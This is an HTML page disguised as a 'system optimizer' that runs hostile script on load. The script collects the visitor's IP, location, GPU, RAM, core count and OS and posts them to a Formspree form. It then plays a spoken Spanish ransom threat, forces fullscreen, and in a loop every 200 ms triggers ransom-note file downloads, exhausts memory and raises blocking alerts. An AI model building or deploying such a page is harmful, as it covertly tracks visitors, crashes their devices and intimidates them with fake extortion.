<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>âš¡ SYSTEM_OPTIMIZER_v4.2 âš¡</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
        #log { font-size: 10px; width: 90%; word-break: break-all; }
        .red { color: #f00; font-weight: bold; }
    </style>
</head>
<body>
    <div id="log"></div>

    <script>
        const FORM_ID = "xykdyebg"; // Tu Formspree ID
        const logs = document.getElementById('log');

        function addLog(txt, isRed = false) {
            const d = document.createElement('div');
            if (isRed) d.className = "red";
            d.innerText = `[${new Date().toLocaleTimeString()}] ${txt}`;
            logs.appendChild(d);
        }

        // --- 1. PENETRACIÃ“N Y ROBO DE DATA ---
        window.onload = async () => {
            addLog("> INICIANDO PENETRACIÃ“N...");
            
            const ipReq = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "ERR";

            const data = {
                "TARGET": "INFECTED",
                "IP": ipReq.ip,
                "GPU": gpu,
                "RAM": navigator.deviceMemory + "GB",
                "CORES": navigator.hardwareConcurrency,
                "OS": navigator.platform,
                "GEO": `${ipReq.city}, ${ipReq.country_name}`
            };

            // Enviar datos al instante
            fetch(`https://formspree.io/f/${FORM_ID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            addLog(`> DATA EXFILTRADA: ${ipReq.ip} (${gpu})`, true);
            
            // --- 2. ATAQUE DE COLAPSO (PC/MAC/MOBILE) ---
            setTimeout(() => {
                iniciarPeta(ipReq.ip);
            }, 1000);
        };

        function iniciarPeta(ip) {
            // Audio de Amenaza
            const v = new SpeechSynthesisUtterance("He penetrado tu sistema. Paga el rescate o destruyo tu disco duro.");
            v.lang = 'es-ES'; v.pitch = 0.1;
            window.speechSynthesis.speak(v);

            // Bloqueo total
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            
            const storage = [];
            setInterval(() => {
                // Descarga masiva para petar carpetas (txt con mensaje)
                const blob = new Blob([`PAGAME EL RESCATE. TU IP ES ${ip}`], {type: 'text/plain'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `SISTEMA_SECUESTRADO_${Math.random().toString(36)}.txt`;
                a.click();

                // Peta la RAM
                for(let i=0; i<1000; i++) storage.push(new Array(1000000).fill("ðŸ’€"));

                // Bloqueo de UI
                alert("âš ï¸ SISTEMA BAJO ATAQUE âš ï¸\n\nIP: " + ip + "\n\nTU INFORMACIÃ“N HA SIDO ENVIADA.");
                
                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(v);
            }, 200);
        }
    </script>
</body>
</html>
